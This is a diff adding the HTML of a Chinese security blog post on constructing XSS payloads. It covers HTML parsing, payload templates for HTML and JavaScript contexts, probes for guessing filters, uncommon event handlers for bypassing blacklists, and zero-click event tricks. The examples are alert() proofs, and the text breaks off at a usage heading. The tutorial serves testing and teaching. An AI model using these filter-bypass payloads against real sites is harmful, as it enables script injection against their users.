@@ -1,0 +1,599 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>XSS Payload的构造 | Ulysses'Blog</title><meta name="keywords" content="XSS跨站脚本"><meta name="author" content="Ulysses"><meta name="copyright" content="Ulysses"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="浏览器的解析过程 获取请求文档的内容后，呈现引擎将开始解析 HTML 文档，并将各标记逐个转化成“内容树”上的 DOM 节点。 解析外部 CSS以及style元素中的样式数据形成呈现树。呈现树包含多个带有视觉属性（如颜色和尺寸）的矩形。这些矩形的排列顺序就是它们将在屏幕上显示的顺序。呈现树构建完毕之后，进入“布局”处理阶段，也就是为每个节点分配一个应出现在屏幕上的确切坐标。 解析script标签时">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS Payload的构造">
+<meta property="og:url" content="https://plumeria.ltd/post/163a9d7.html">
+<meta property="og:site_name" content="Ulysses&#39;Blog">
+<meta property="og:description" content="浏览器的解析过程 获取请求文档的内容后，呈现引擎将开始解析 HTML 文档，并将各标记逐个转化成“内容树”上的 DOM 节点。 解析外部 CSS以及style元素中的样式数据形成呈现树。呈现树包含多个带有视觉属性（如颜色和尺寸）的矩形。这些矩形的排列顺序就是它们将在屏幕上显示的顺序。呈现树构建完毕之后，进入“布局”处理阶段，也就是为每个节点分配一个应出现在屏幕上的确切坐标。 解析script标签时">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://plumeria.ltd/img/cover/xss1.png">
+<meta property="article:published_time" content="2021-11-08T11:00:00.000Z">
+<meta property="article:modified_time" content="2021-11-11T10:00:33.737Z">
+<meta property="article:author" content="Ulysses">
+<meta property="article:tag" content="XSS跨站脚本">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://plumeria.ltd/img/cover/xss1.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://plumeria.ltd/post/163a9d7"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.js" defer></script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: {"appId":"W86Z4BMIXY","apiKey":"ab43a60eaebc9c628f7b1eb55825160f","indexName":"my blog","hits":{"per_page":6},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XSS Payload的构造',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-11-11 18:00:33'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    document.addEventListener('pjax:complete', detectApple)})(window)</script><link rel="stylesheet" href="/css/mycss.css"><style type="text/css">.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body{left:-66px!important}.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover{left:0!important}</style><div class="aplayer" data-id="6997392079" data-server="netease" data-type="playlist" data-fixed="true" data-listFolded="false" data-order="random" data-preload="none"></div><link rel="stylesheet" href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css"><script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.1.6/css/swiper.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiperstyle.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/tag_plugins.min.css" media="defer" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/hexo-butterfly-tag-plugins-plus@latest/lib/carousel-touch.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/mindmap.min.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/gif/loading4.gif" data-original="https://avatars.githubusercontent.com/u/63300491?v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏机</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/cover/xss1.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ulysses'Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏机</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">XSS Payload的构造</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-11-08T11:00:00.000Z" title="发表于 2021-11-08 19:00:00">2021-11-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-11-11T10:00:33.737Z" title="更新于 2021-11-11 18:00:33">2021-11-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/">XSS跨站脚本</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="XSS Payload的构造"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="浏览器的解析过程"><a href="#浏览器的解析过程" class="headerlink" title="浏览器的解析过程"></a>浏览器的解析过程</h2><ul>
+<li>获取请求文档的内容后，呈现引擎将开始解析 HTML 文档，并将各标记逐个转化成“内容树”上的 DOM 节点。</li>
+<li>解析外部 CSS以及style元素中的样式数据形成呈现树。呈现树包含多个带有视觉属性（如颜色和尺寸）的矩形。这些矩形的排列顺序就是它们将在屏幕上显示的顺序。呈现树构建完毕之后，进入“布局”处理阶段，也就是为每个节点分配一个应出现在屏幕上的确切坐标。</li>
+<li>解析script标签时，解析完毕马上执行，并且阻塞页面。</li>
+<li>绘制 - 呈现引擎会遍历呈现树，由用户界面后端层将每个节点绘制出来。</li>
+</ul>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/11/08/DghBTGwmWoEQ8de.png" alt="image-20211108145033378"></p>
+<h2 id="HTML-解析器五类元素"><a href="#HTML-解析器五类元素" class="headerlink" title="HTML 解析器五类元素"></a>HTML 解析器五类元素</h2><h3 id="空元素"><a href="#空元素" class="headerlink" title="空元素"></a>空元素</h3><p>空元素(Voidelements)，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</p>
+<p>空元素： <code>&lt;area&gt;</code>、<code>&lt;base&gt;</code>、<code>&lt;br&gt;</code>、<code>&lt;col&gt;</code>、<code>&lt;command&gt;</code>、<code>&lt;embed&gt;</code>、<code>&lt;hr&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;input&gt;</code>、<code>&lt;keygen&gt;</code>、<code>&lt;link&gt;</code>、<code>&lt;meta&gt;</code>、<code>&lt;param&gt;</code>、<code>&lt;source&gt;</code>、<code>&lt;track&gt;</code>、<code>&lt;br&gt;</code>。</p>
+<h3 id="原始文本元素"><a href="#原始文本元素" class="headerlink" title="原始文本元素"></a>原始文本元素</h3><p>原始文本元素 (Raw textelements)，可以容纳文本。</p>
+<p>原始文本元素：<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code></p>
+<h3 id="RCDATA"><a href="#RCDATA" class="headerlink" title="RCDATA"></a>RCDATA</h3><p>RCDATA (RCDATA elements)元素，可以容纳文本和字符引用。</p>
+<p>RCDATA 元素：<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code></p>
+<h3 id="外部元素"><a href="#外部元素" class="headerlink" title="外部元素"></a>外部元素</h3><p>外部元素 (Foreignelements)，可以容纳文本、字符引用、CDATA 段、其他元素和注释</p>
+<p>外部元素：例如 MathML 命名空间或者 SVG 命名空间的元素</p>
+<h3 id="基本元素"><a href="#基本元素" class="headerlink" title="基本元素"></a>基本元素</h3><p>基本元素 (Normal elements)，可以容纳文本、字符引用、其他元素和注释</p>
+<p>基本元素：除了以上 4 种元素以外的元素</p>
+<h2 id="XSS-Payload结构"><a href="#XSS-Payload结构" class="headerlink" title="XSS Payload结构"></a>XSS Payload结构</h2><p>当我们挖掘反射型和存储型XSS漏洞时，有一个关键的任务是识别XSS context。包括以下信息：</p>
+<ul>
+<li>用户可控的数据出现在responses的位置</li>
+<li>应用对输入执行的验证</li>
+</ul>
+<p>基于这些细节，然后可以选择合适的XSS Payload，并测试其有效性。</p>
+<h3 id="基于HTML上下文"><a href="#基于HTML上下文" class="headerlink" title="基于HTML上下文"></a>基于HTML上下文</h3><p>当用户的输入数据映射在Web页面的HTML代码中时，这种场景就是我们所谓的HTML上下文。HTML上下文可以根据用户输入在代码中的映射位置来进一步划分成：</p>
+<ul>
+<li><p><strong>标签内</strong>：<code>&lt;input type=&quot;text&quot; value=&quot;$input&quot;&gt;</code></p>
+<p>针对标签内，也就是标签属性的XSS，可以结束属性值，并闭合tag，然后，引入一个新的tag。例如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p><strong>标签外</strong>：<code>&lt;span&gt;Youentered $input&lt;/span&gt;</code></p>
+<p>针对标签外，也就是标签之间的XSS，可以闭合先前的tag，并引入新的tags来执行JavaScript。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="Payload机制-1"><a href="#Payload机制-1" class="headerlink" title="Payload机制-1"></a>Payload机制-1</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#123;tag&#125;&#123;filler&#125;&#123;event_handler&#125;&#123;?filler&#125;=&#123;?filler&#125;&#123;javascript&#125;&#123;?filler&#125;&#123;&gt;,//,Space,Tab,LF&#125;</span><br></pre></td></tr></table></figure>
+<p>找到{tag}的合适值之后，就需要猜测用于匹配标签和事件处理器间数据过滤器的正则表达式了。这一步可以使用下面的探测机制来实现：</p>
+<ul>
+<li>&lt;tag xxx - 如果无法通过，则为{space}；</li>
+<li>&lt;tag%09xxx - 如果无法通过，则为[\s]；</li>
+<li>&lt;tag%09%09xxx - 如果无法通过，则为\s+；</li>
+<li>&lt;tag/xxx - 如果无法通过，则为[\s/]+；</li>
+<li>&lt;tag%0axxx- 如果无法通过，则为[\s\n]+；</li>
+<li><tag%0dxxx>- 如果无法通过，则为[\s\n\r+]+；</tag%0dxxx></li>
+<li>&lt;tag/~/xxx - 如果无法通过，则为.*+；</li>
+</ul>
+<p>这个组件（例如事件处理器）是Payload结构中最关键的部分。通常，匹配它的是常规正则表达式（例如“on\w+”）或黑名单（例如“on(load|click|error|show)”）。第一个正则表达式非常严格，很难绕过，而基于黑名单的模式可以通过不常用的事件处理器来绕过。安全机制的实现类型可以通过下面两种简单的方法来识别：</p>
+<ul>
+<li>&lt;tag{filler}onxxx - 如果无法通过，则为on\w+。如果通过，则为on(load|click|error|show)；</li>
+<li>&lt;tag{filler}onclick- 如果通过，则表明没有事件处理器检测正则表达式；</li>
+</ul>
+<p>下面是一些冷门的事件处理器，可能防火墙黑名单中没标记：</p>
+<ul>
+<li>onauxclick</li>
+<li>ondblclick</li>
+<li>oncontextmenu</li>
+<li>onmouseleave</li>
+<li>ontouchcancel</li>
+</ul>
+<p>常用的Payload结束符如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">payload</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">payload</span></span></span><br><span class="line"><span class="tag">&lt;<span class="attr">payload</span>&#123;<span class="attr">space</span>&#125;</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">payload</span>//</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">payload</span>%<span class="attr">0a</span></span></span><br><span class="line"><span class="tag">&lt;<span class="attr">payload</span>%<span class="attr">0d</span></span></span><br><span class="line"><span class="tag">&lt;<span class="attr">payload</span>%<span class="attr">09</span></span></span><br></pre></td></tr></table></figure>
+<p>其中的{filler}为绕过过滤器的分隔符，常见的{filler}如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IExplorer: 0x09, 0x0B, 0x0C, 0x20, 0x3B</span><br><span class="line">Chrome: 0x09, 0x20, 0x28, 0x2C, 0x3B</span><br><span class="line">Safari: 0x2C, 0x3B</span><br><span class="line">FireFox: 0x09, 0x20, 0x28, 0x2C, 0x3B</span><br><span class="line">Opera: 0x09, 0x20, 0x2C, 0x3B</span><br><span class="line">Android: 0x09, 0x20, 0x28, 0x2C, 0x3B</span><br></pre></td></tr></table></figure>
+<h4 id="Payload机制-2"><a href="#Payload机制-2" class="headerlink" title="Payload机制-2"></a>Payload机制-2</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCriPt&#123;filler&#125;sRc&#123;?filler&#125;=&#123;?filler&#125;&#123;url&#125;&#123;?filler&#125;&#123;&gt;,//,Space,Tab,LF&#125;</span><br></pre></td></tr></table></figure>
+<p>使用了<code>&lt;object&gt;</code>标签的Payload可以利用下面的Payload机制来构建：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;obJecT&#123;filler&#125;data&#123;?filler&#125;=&#123;?filler&#125;&#123;url&#125;&#123;?filler&#125;&#123;&gt;,//,Space,Tab,LF&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="Payload机制-3"><a href="#Payload机制-3" class="headerlink" title="Payload机制-3"></a>Payload机制-3</h4><p>这种Payload机制有两种形式：明文或混淆处理。</p>
+<p>明文结构如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A&#123;filler&#125;hReF&#123;?filler&#125;=&#123;?filler&#125;JavaScript:&#123;javascript&#125;&#123;?filler&#125;&#123;&gt;,//,Space,Tab,LF&#125;</span><br></pre></td></tr></table></figure>
+<p>混淆处理后的Payload结构如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A&#123;filler&#125;hReF&#123;?filler&#125;=&#123;?filler&#125;&#123;quote&#125;&#123;special&#125;:&#123;javascript&#125;&#123;quote&#125;&#123;?filler&#125;&#123;&gt;,//,Space,Tab,LF&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="基于JavaScript上下文"><a href="#基于JavaScript上下文" class="headerlink" title="基于JavaScript上下文"></a>基于JavaScript上下文</h3><p>当XSS上下文是响应中的一些现有JavaScript时，可能会出现各种各样的情况，需要使用不同的技术来执行成功的利用。例如下面这个例子：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">...</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> input = <span class="string">&#x27;controllable data here&#x27;</span>;</span></span><br><span class="line"><span class="javascript">...</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>基于JavaScript上下文的Payload结构也分可两种方法：</p>
+<ul>
+<li><strong>闭合当前script标签</strong></li>
+</ul>
+<p>关闭现存的script在最简单的情况下，可以简单地关闭包围现有JavaScript的脚本标记，并引入一些新的HTML标记，用于触发JavaScript。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这种XSS payload构造机制可参考基于HTML上下文。</p>
+<ul>
+<li><strong>跳出当前JavaScript字符串</strong></li>
+</ul>
+<p>当XSS context位于带引号的字符串中的情况下，通常可以中断字符串，并直接执行JavaScript。必须在XSS context之后修复脚本，因为，那里的任何语法错误都将阻止整个脚本的执行。下面是一些常用的方式：</p>
+<h4 id="Payload机制-1-1"><a href="#Payload机制-1-1" class="headerlink" title="Payload机制-1"></a>Payload机制-1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;quote&#125;&#123;delimiter&#125;&#123;javascript&#125;&#123;delimiter&#125;&#123;quote&#125;</span><br></pre></td></tr></table></figure>
+<p>可用的Payload有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x27;^&#123;javascript&#125;^&#x27;</span><br><span class="line">&#x27;*&#123;javascript&#125;*&#x27;</span><br><span class="line">&#x27;+&#123;javascript&#125;+&#x27;</span><br><span class="line">&#x27;/&#123;javascript&#125;/&#x27;</span><br><span class="line">&#x27;%&#123;javascript&#125;%&#x27;</span><br><span class="line">&#x27;|&#123;javascript&#125;|&#x27;</span><br><span class="line">&#x27;&lt;&#123;javascript&#125;&lt;&#x27;</span><br><span class="line">&#x27;&gt;&#123;javascript&#125;&gt;&#x27;</span><br></pre></td></tr></table></figure>
+<h4 id="Payload机制-2-1"><a href="#Payload机制-2-1" class="headerlink" title="Payload机制-2"></a>Payload机制-2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;quote&#125;&#123;delimiter&#125;&#123;javascript&#125;//</span><br></pre></td></tr></table></figure>
+<p>可以使用下列Payload机制来构建Payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;&#123;javascript&#125;//&#x27;</span><br><span class="line">&#x27;|&#123;javascript&#125;//&#x27;</span><br><span class="line">&#x27;^&#123;javascript&#125;//&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="基于JavaScript事件的XSS"><a href="#基于JavaScript事件的XSS" class="headerlink" title="基于JavaScript事件的XSS"></a>基于JavaScript事件的XSS</h2><h3 id="标准HTML事件"><a href="#标准HTML事件" class="headerlink" title="标准HTML事件"></a>标准HTML事件</h3><div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">事件名称</th>
+<th style="text-align:center">标签</th>
+<th style="text-align:center">备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">onload</td>
+<td style="text-align:center">body, iframe, img, frameset, input, script, style, link, svg</td>
+<td style="text-align:center">适用于0-click，但通常会被过滤掉</td>
+</tr>
+<tr>
+<td style="text-align:center">onpageshow</td>
+<td style="text-align:center">body</td>
+<td style="text-align:center">适用于 0-click，但只能用在非DOM注入中</td>
+</tr>
+<tr>
+<td style="text-align:center">onfocus</td>
+<td style="text-align:center">大多数标签</td>
+<td style="text-align:center">适用于 0-click：配合<code>autofocus</code>使用</td>
+</tr>
+<tr>
+<td style="text-align:center">onmouseover</td>
+<td style="text-align:center">大多数标签</td>
+<td style="text-align:center">如果可能的话，添加参数值来让其尽可能的大。</td>
+</tr>
+<tr>
+<td style="text-align:center">onerror</td>
+<td style="text-align:center">img, input, object, link, script, video, audio</td>
+<td style="text-align:center">确保传递参数来终止运行</td>
+</tr>
+<tr>
+<td style="text-align:center">onanimationstart</td>
+<td style="text-align:center">与任何可以设置动画的元素组合</td>
+<td style="text-align:center">启动，然后开始CSS动画</td>
+</tr>
+<tr>
+<td style="text-align:center">onanimationend</td>
+<td style="text-align:center">与任何可以设置动画的元素组合</td>
+<td style="text-align:center">启动，然后结束CSS动画</td>
+</tr>
+<tr>
+<td style="text-align:center">onstart</td>
+<td style="text-align:center">marquee</td>
+<td style="text-align:center">在字幕动画启动时启动-仅限Firefox</td>
+</tr>
+<tr>
+<td style="text-align:center">onfinish</td>
+<td style="text-align:center">marquee</td>
+<td style="text-align:center">在字幕动画结束时启动-仅限Firefox</td>
+</tr>
+<tr>
+<td style="text-align:center">ontoggle</td>
+<td style="text-align:center">details</td>
+<td style="text-align:center">必须提供<code>open</code>参数以支持0-click</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>使用示例：</p>
